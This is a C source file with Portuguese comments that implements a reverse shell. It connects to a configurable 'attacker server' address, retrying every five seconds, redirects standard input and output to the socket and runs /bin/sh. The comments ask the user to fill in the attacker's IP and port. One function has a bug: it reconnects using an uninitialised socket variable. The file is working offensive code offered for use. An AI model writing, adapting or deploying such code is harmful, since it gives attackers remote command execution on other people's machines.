#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <netinet/in.h>
#include <arpa/inet.h>

#define SERVER_ADDRESS "127.0.0.1"      /* COLOQUE O IP DO SERVIDOR AQUI */
#define SERVER_PORT 1337                /* COLOQUE A PORTA DO SERVIDOR AQUI*/

// Declaração das funções
int initializeSocket();     /* FUNCAO RESPONSAVEL POR INICIALIZAR O SOCKET */
int connectToServer();      /* FUNCAO RESPONSAVEL POR CONECTAR AO SERVIDOR ATACANTE */
int redirectStdio();        /* FUNCAO RESPONSAVEL POR DIRECIONAR AS SAIDAS AO SOCKET */
void executeShell();        /* FUNCAO RESPONSAVEL POR INICIAR O CMD E ENVIAR AO SERVIDOR ATACANTE */

int main(void)
{
    int sockfd = initializeSocket();
    if (sockfd == -1)
    {
        perror("initializeSocket");
        exit(EXIT_FAILURE);
    }

    if (connectToServer(sockfd) == -1)
    {
        perror("connectToServer");
        exit(EXIT_FAILURE);
    }

    if (redirectStdio() == -1)
    {
        perror("redirectStdio");
        exit(EXIT_FAILURE);
    }

    executeShell();

    return EXIT_SUCCESS;
}

int initializeSocket()
{
    int sockfd = socket(AF_INET, SOCK_STREAM, 0);
    if (sockfd == -1)
    {
        return -1;
    }

    return sockfd;
}

int connectToServer(int sockfd)
{
    struct sockaddr_in addr;
    memset(&addr, 0, sizeof(addr));
    addr.sin_family = AF_INET;
    addr.sin_port = htons(SERVER_PORT);
    inet_pton(AF_INET, SERVER_ADDRESS, &(addr.sin_addr));

    while (connect(sockfd, (struct sockaddr *)&addr, sizeof(addr)) == -1)
    {
        sleep(5);
        printf("[.] Aguardando conexao...");
    }

    return sockfd;
}

int redirectStdio()
{
    int sockfd = connectToServer(sockfd);
    if (sockfd == -1)
    {
        return -1;
    }

    for (int i = 0; i < 3; i++)
    {
        if (dup2(sockfd, i) == -1)
        {
            return -1;
        }
    }

    return 0;
}

void executeShell()
{
    char* cmd[] = {"/bin/sh", NULL};
    execve("/bin/sh", cmd, NULL);

    perror("execve");
    exit(EXIT_FAILURE);
}
